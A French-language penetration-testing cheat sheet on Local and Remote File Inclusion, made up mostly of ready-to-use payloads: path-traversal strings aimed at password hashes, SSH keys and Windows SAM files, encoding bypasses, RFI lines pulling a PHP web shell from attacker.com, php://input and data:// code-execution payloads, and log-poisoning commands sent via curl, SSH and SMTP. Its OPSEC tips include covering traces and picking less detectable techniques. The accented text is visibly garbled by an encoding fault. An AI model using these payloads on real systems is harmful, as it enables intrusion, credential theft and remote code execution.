# Local File Inclusion (LFI) & Remote File Inclusion (RFI)

## üóÇÔ∏è Workflow d'exploitation LFI/RFI
1. Identification des param√®tres d'inclusion (file=, page=, include=)
   ‚Üì
2. Test d'inclusion de fichiers locaux (../../../etc/passwd)
   ‚Üì
3. Bypass des protections (null bytes, encodage, wrappers)
   ‚Üì
4. √ânum√©ration du syst√®me (logs, config, code source)
   ‚Üì
5. Tentative RFI (inclusion de fichiers distants)
   ‚Üì
6. Exploitation avanc√©e (log poisoning, wrapper PHP, RCE)

## üìã Vue d'ensemble

Les vuln√©rabilit√©s LFI/RFI permettent d'inclure des fichiers locaux ou distants dans l'ex√©cution d'une application web, souvent menant √† la divulgation d'informations ou l'ex√©cution de code.

> **üí° Explication Simple** : C'est comme demander √† quelqu'un de vous lire un livre, mais au lieu de dire "lis-moi le chapitre 3", vous dites "lis-moi le fichier contenant tous les mots de passe". L'application ob√©it sans v√©rifier.

## üîç D√©tection des Vuln√©rabilit√©s

### Param√®tres susceptibles
```
?file=
?page=
?include=
?path=
?dir=
?document=
?folder=
?root=
?pg=
?style=
?pdf=
?template=
?php_path=
?doc=
```

### Tests de d√©tection LFI
```bash
# Tests basiques
?file=../../../etc/passwd
?file=..\..\..\..\windows\system32\drivers\etc\hosts
?file=/etc/passwd
?file=C:\windows\system32\drivers\etc\hosts

# Avec encodage URL
?file=..%2F..%2F..%2Fetc%2Fpasswd
?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Double encodage
?file=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

## üéØ Exploitation LFI

### Fichiers cibles par OS

#### Linux/Unix
```bash
# Fichiers syst√®me critiques
/etc/passwd              # Utilisateurs syst√®me
/etc/shadow              # Hashes de mots de passe
/etc/group               # Groupes
/etc/hosts               # R√©solution DNS locale
/etc/fstab               # Points de montage
/etc/crontab             # T√¢ches planifi√©es
/etc/ssh/sshd_config     # Configuration SSH

# Logs syst√®me
/var/log/auth.log        # Logs d'authentification
/var/log/apache2/access.log  # Logs Apache
/var/log/nginx/access.log    # Logs Nginx
/var/log/messages        # Messages syst√®me
/var/log/syslog          # Log syst√®me g√©n√©ral

# Configuration applications
/etc/apache2/sites-enabled/000-default
/etc/nginx/sites-enabled/default
/var/www/html/config.php
/home/user/.ssh/id_rsa
/home/user/.bash_history
```

#### Windows
```bash
# Fichiers syst√®me
C:\windows\system32\drivers\etc\hosts
C:\windows\system32\drivers\etc\lmhosts
C:\windows\win.ini
C:\windows\system.ini
C:\windows\system32\config\sam
C:\windows\system32\config\system

# Logs et configuration
C:\windows\system32\logfiles\httperr\httperr1.log
C:\inetpub\logs\logfiles\w3svc1\
C:\windows\temp\
C:\inetpub\wwwroot\web.config

# Profils utilisateurs
C:\Users\Administrator\Desktop\
C:\Users\Administrator\Documents\
C:\Documents and Settings\Administrator\Desktop\
```

### Techniques de bypass

#### Null byte (anciennes versions PHP)
```bash
?file=../../../etc/passwd%00
?file=../../../etc/passwd%00.jpg
?file=../../../etc/passwd\0
```

#### Encodage et variations
```bash
# Encodage URL double
?file=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd

# Encodage UTF-8
?file=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd

# Variations de slash
?file=....//....//....//etc/passwd
?file=..\..\..\..\etc\passwd

# 16-bit Unicode
?file=.%u002e/.%u002e/.%u002e/etc/passwd
```

#### Techniques de contournement
```bash
# Ajout d'extension forc√©e
?file=../../../etc/passwd.....
?file=../../../etc/passwd//..//..//..///

# Utilisation de wrappers
?file=php://filter/read=convert.base64-encode/resource=../../../etc/passwd
?file=compress.zlib://data/who/cares/about/path?/../../../etc/passwd
```

## üåê Remote File Inclusion (RFI)

### Tests de base RFI
```bash
# Inclusion HTTP
?file=http://attacker.com/shell.txt
?file=http://attacker.com/shell.txt?
?file=http://attacker.com/shell.txt%00

# Inclusion FTP
?file=ftp://attacker.com/shell.txt

# Inclusion avec protocoles
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K
```

### Cr√©ation de payload RFI
```php
<?php
// shell.txt sur le serveur attaquant
system($_GET['c']);
?>

// Usage apr√®s inclusion
?file=http://attacker.com/shell.txt&c=whoami
?file=http://attacker.com/shell.txt&c=cat /etc/passwd
```

## üîß Wrappers PHP

### php://filter
```bash
# Lecture en base64
?file=php://filter/read=convert.base64-encode/resource=index.php

# Lecture avec rot13
?file=php://filter/read=string.rot13/resource=index.php

# Cha√Æne de filtres
?file=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
```

### php://input
```bash
# Avec POST data
curl -X POST --data "<?php system('whoami'); ?>" "http://target.com/page.php?file=php://input"

# Avec session upload
?file=php://input
POST: <?php system($_GET['cmd']); ?>
```

### data://
```bash
# Ex√©cution directe
?file=data://text/plain,<?php system('whoami'); ?>

# Avec base64
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTsgPz4K
```

## üß™ Log Poisoning

### Apache/Nginx logs
```bash
# 1. Trouver le log accessible
?file=../../../var/log/apache2/access.log

# 2. Empoisonner via User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# 3. Exploiter
?file=../../../var/log/apache2/access.log&cmd=whoami
```

### SSH logs
```bash
# 1. Tentative de connexion SSH avec payload
ssh '<?php system($_GET["cmd"]); ?>'@target.com

# 2. Inclusion du log
?file=../../../var/log/auth.log&cmd=id
```

### Mail logs
```bash
# 1. Envoyer email avec payload PHP
telnet target.com 25
mail from: <?php system($_GET['cmd']); ?>

# 2. Inclusion
?file=../../../var/log/mail.log&cmd=whoami
```

## üõ°Ô∏è Conseils OPSEC
- √âviter les fichiers sensibles sans autorisation (/etc/shadow, SAM)
- Utiliser des payloads discrets dans les logs (pas de commandes √©videntes)
- Nettoyer les traces apr√®s exploitation (logs empoisonn√©s)
- Pr√©f√©rer les wrappers PHP aux inclusions HTTP (moins d√©tectable)
- Documenter tous les fichiers consult√©s pour la reproductibilit√©

## ‚ö†Ô∏è Erreurs fr√©quentes
- Oublier de tester tous les param√®tres suspects (pas seulement file=)
- Ne pas adapter les chemins selon l'OS (Unix vs Windows)
- Ignorer les wrappers PHP (plus puissants que l'inclusion basique)
- Lancer des RFI sans v√©rifier les protections r√©seau
- Ne pas nettoyer les logs empoisonn√©s apr√®s exploitation

## üí° Astuces
- Combiner LFI avec log poisoning pour obtenir RCE
- Utiliser php://filter pour lire le code source sans ex√©cution
- Tester les inclusions dans les erreurs 404 personnalis√©es
- Chercher les fichiers de configuration pour obtenir des credentials
- Utiliser data:// pour des payloads sans fichier externe

## üîó Pour aller plus loin
- [PayloadsAllTheThings - LFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [HackTricks - LFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
- [OWASP LFI](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
- [PHP Wrappers](https://www.php.net/manual/en/wrappers.php)

## üß≠ Navigation
- [Guide SQL Injection](./SQL_Injection.md)
- [Guide XSS](./XSS.md)
- [Retour aux applications web](./README.md) 